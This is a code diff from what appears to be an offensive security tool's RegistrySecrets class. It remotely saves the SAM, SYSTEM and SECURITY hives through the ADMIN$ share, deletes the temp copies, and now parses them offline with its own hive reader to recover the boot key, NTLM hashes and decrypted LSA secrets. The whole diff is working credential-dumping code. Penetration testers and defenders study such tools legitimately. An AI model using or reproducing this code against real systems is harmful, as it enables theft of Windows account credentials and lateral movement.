@@ -107,13 +107,9 @@ class RegistrySecrets:
             svc.close_handle(handle)
 
     def dump_sam(self) -> list[SamHash]:
-        """Extract NTLM hashes from SAM via hive save + offline parse.
-
-        Uses RegSaveKey to dump SAM/SYSTEM hives to temp files (bypasses
-        per-key ACLs on Win11), reads them via SMB, parses offline.
-        """
+        """Extract NTLM hashes from SAM via hive save + offline parse."""
         import secrets as _secrets
-        from impacket.examples.secretsdump import SAMHashes, LocalOperations
+        from .hivereader import RegistryHive
 
         rand = _secrets.token_hex(4)
         sam_path = f"C:\\Windows\\Temp\\{rand}_s"
@@ -125,70 +121,75 @@ class RegistrySecrets:
                 reg.bind()
                 hklm = reg.open_hklm()
 
-                # Save SAM hive
                 sam_key = reg.open_key(hklm, "SAM")
                 reg.save_key(sam_key, sam_path)
                 reg.close_key(sam_key)
 
-                # Save SYSTEM hive
                 sys_key = reg.open_key(hklm, "SYSTEM")
                 reg.save_key(sys_key, sys_path)
                 reg.close_key(sys_key)
 
                 reg.close_key(hklm)
 
-            # Read hive files via SMB
             sam_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_s")
             sys_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_y")
 
         finally:
-            # Cleanup temp files
             for fname in (f"Temp\\{rand}_s", f"Temp\\{rand}_y"):
                 try:
                     self.session.delete_file("ADMIN$", fname)
                 except Exception:
                     pass
 
-        # Write to local temp and parse with impacket
-        import tempfile
-        import os
+        # Parse SYSTEM hive to get boot key
+        sys_hive = RegistryHive(sys_data)
+        boot_key = self._boot_key_from_hive(sys_hive)
+
+        # Parse SAM hive
+        sam_hive = RegistryHive(sam_data)
         hashes = []
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            sam_file = os.path.join(tmpdir, "SAM")
-            sys_file = os.path.join(tmpdir, "SYSTEM")
-            with open(sam_file, "wb") as f:
-                f.write(sam_data)
-            with open(sys_file, "wb") as f:
-                f.write(sys_data)
+        try:
+            account_key = sam_hive.open_key("SAM\\Domains\\Account")
+            _, f_value = sam_hive.query_value(account_key, "F")
+        except (KeyError, ValueError):
+            raise RuntimeError("Cannot read SAM Account data")
 
-            # Get boot key
-            local_ops = LocalOperations(sys_file)
-            boot_key = local_ops.getBootKey()
+        if len(f_value) < 0x70:
+            raise RuntimeError("SAM F value too short")
 
-            # Parse SAM
-            def _callback(secret):
-                # Format: "user:rid:lm:nt:::"
-                parts = secret.split(":")
-                if len(parts) >= 4:
-                    hashes.append(SamHash(
-                        username=parts[0],
-                        rid=int(parts[1]),
-                        lm_hash=parts[2],
-                        ntlm_hash=parts[3],
-                    ))
+        hashed_boot_key = compute_hashed_boot_key(boot_key, f_value)
+        sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]
 
-            sam_hashes = SAMHashes(sam_file, boot_key, isRemote=False,
-                                   perSecretCallback=lambda s: _callback(s))
-            sam_hashes.dump()
-            sam_hashes.finish()
+        # Enumerate user RIDs
+        try:
+            users_key = sam_hive.open_key("SAM\\Domains\\Account\\Users")
+        except KeyError:
+            return hashes
+
+        for subkey_name in sam_hive.enum_subkeys(users_key):
+            if subkey_name == "Names" or len(subkey_name) != 8:
+                continue
+            try:
+                rid = int(subkey_name, 16)
+            except ValueError:
+                continue
+
+            try:
+                user_key = sam_hive.open_key(f"SAM\\Domains\\Account\\Users\\{subkey_name}")
+                _, v_value = sam_hive.query_value(user_key, "V")
+                sam_hash = self._parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
+                if sam_hash:
+                    hashes.append(sam_hash)
+            except (KeyError, RuntimeError):
+                continue
 
         return hashes
 
     def dump_lsa_secrets(self) -> list[LsaSecret]:
         """Extract LSA secrets via hive save + offline parse."""
         import secrets as _secrets
-        from impacket.examples.secretsdump import LSASecrets, LocalOperations
+        from .hivereader import RegistryHive
 
         rand = _secrets.token_hex(4)
         sec_path = f"C:\\Windows\\Temp\\{rand}_e"
@@ -200,12 +201,10 @@ class RegistrySecrets:
                 reg.bind()
                 hklm = reg.open_hklm()
 
-                # Save SECURITY hive
                 sec_key = reg.open_key(hklm, "SECURITY")
                 reg.save_key(sec_key, sec_path)
                 reg.close_key(sec_key)
 
-                # Save SYSTEM hive (if not already saved)
                 sys_key = reg.open_key(hklm, "SYSTEM")
                 reg.save_key(sys_key, sys_path)
                 reg.close_key(sys_key)
@@ -222,29 +221,37 @@ class RegistrySecrets:
                 except Exception:
                     pass
 
-        import tempfile
-        import os
+        # Parse
+        sys_hive = RegistryHive(sys_data)
+        sec_hive = RegistryHive(sec_data)
+        boot_key = self._boot_key_from_hive(sys_hive)
         secrets = []
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            sec_file = os.path.join(tmpdir, "SECURITY")
-            sys_file = os.path.join(tmpdir, "SYSTEM")
-            with open(sec_file, "wb") as f:
-                f.write(sec_data)
-            with open(sys_file, "wb") as f:
-                f.write(sys_data)
+        # Get LSA encryption key from Policy\PolEKList
+        try:
+            pol_key = sec_hive.open_key("Policy\\PolEKList")
+            _, pol_data = sec_hive.query_value(pol_key, "(Default)")
+        except KeyError:
+            return secrets
 
-            local_ops = LocalOperations(sys_file)
-            boot_key = local_ops.getBootKey()
+        lsa_key = decrypt_lsa_key(boot_key, pol_data)
 
-            def _callback(secret_type, secret):
-                secrets.append(LsaSecret(name=str(secret_type), value=b"", decoded=secret))
+        # Enumerate secrets
+        try:
+            secrets_key = sec_hive.open_key("Policy\\Secrets")
+        except KeyError:
+            return secrets
 
-            lsa = LSASecrets(sec_file, boot_key, None, isRemote=False,
-                             perSecretCallback=lambda st, s: _callback(st, s))
-            lsa.dumpCachedHashes()
-            lsa.dumpSecrets()
-            lsa.finish()
+        for name in sec_hive.enum_subkeys(secrets_key):
+            try:
+                currval_key = sec_hive.open_key(f"Policy\\Secrets\\{name}\\CurrVal")
+                _, encrypted = sec_hive.query_value(currval_key, "(Default)")
+                decrypted = decrypt_lsa_secret(lsa_key, encrypted)
+                secret = LsaSecret(name=name, value=decrypted)
+                secret.decoded = self._decode_secret(name, decrypted)
+                secrets.append(secret)
+            except (KeyError, RuntimeError):
+                continue
 
         return secrets
 
@@ -253,7 +260,7 @@ class RegistrySecrets:
         return []
 
     def _get_boot_key(self, reg: WinReg, hklm: bytes) -> bytes:
-        """Extract boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa."""
+        """Extract boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa via RPC."""
         # First find CurrentControlSet
         select_key = reg.open_key(hklm, r"SYSTEM\Select")
         _, current_data = reg.query_value(select_key, "Current")
@@ -263,20 +270,32 @@ class RegistrySecrets:
 
         lsa_key = reg.open_key(hklm, cs_path)
 
-        # Read class names from JD, Skew1, GBG, Data subkeys
         parts = []
         for name in ("JD", "Skew1", "GBG", "Data"):
             subkey = reg.open_key(lsa_key, name)
-            # The class name is returned by enum_key with special handling
-            # We need to use OpenKey and get the class — but MS-RRP doesn't
-            # expose class directly. We use BaseRegQueryInfoKey (opnum 16) or
-            # the class is part of the key name enumeration.
-            # Alternative: read the key's class via enum from parent
             class_name = self._get_key_class(reg, lsa_key, name)
             parts.append(class_name)
             reg.close_key(subkey)
 
         reg.close_key(lsa_key)
+        return extract_boot_key(parts[0], parts[1], parts[2], parts[3])
+
+    def _boot_key_from_hive(self, sys_hive) -> bytes:
+        """Extract boot key from an offline SYSTEM hive file."""
+        # Find CurrentControlSet number from Select\Current
+        select_key = sys_hive.open_key("Select")
+        _, current_data = sys_hive.query_value(select_key, "Current")
+        cs_num = struct.unpack_from("<I", current_data, 0)[0]
+        cs_path = f"ControlSet{cs_num:03d}\\Control\\Lsa"
+
+        lsa_key = sys_hive.open_key(cs_path)
+
+        parts = []
+        for name in ("JD", "Skew1", "GBG", "Data"):
+            subkey = sys_hive.open_key(f"{cs_path}\\{name}")
+            class_data = sys_hive.query_key_class(subkey)
+            parts.append(class_data)
+
         return extract_boot_key(parts[0], parts[1], parts[2], parts[3])
 
     def _get_key_class(self, reg: WinReg, parent: bytes, name: str) -> bytes:
